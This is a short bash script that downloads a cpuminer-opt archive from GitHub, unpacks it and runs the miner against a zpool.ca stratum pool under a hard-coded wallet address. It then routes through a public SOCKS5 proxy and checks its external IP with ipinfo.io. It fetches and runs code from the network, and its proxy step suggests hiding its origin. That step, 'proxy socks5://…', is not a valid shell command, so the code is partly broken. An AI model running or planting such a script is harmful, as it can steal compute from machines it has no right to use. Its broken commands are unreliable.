#!/bin/bash
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz >/dev/null 2>&1 
./cpuminer-sse2amd -a yescryptr16 -o stratum+tcps://yescryptR16.na.mine.zpool.ca:56333 -u DDbS8XAACUw6uRuc7Fnja1b5Rv5bHeiPmU -p c=DGB,zap=QOGE -t 1 && proxy socks5://184.178.172.14:4145 && curl ipinfo.io 
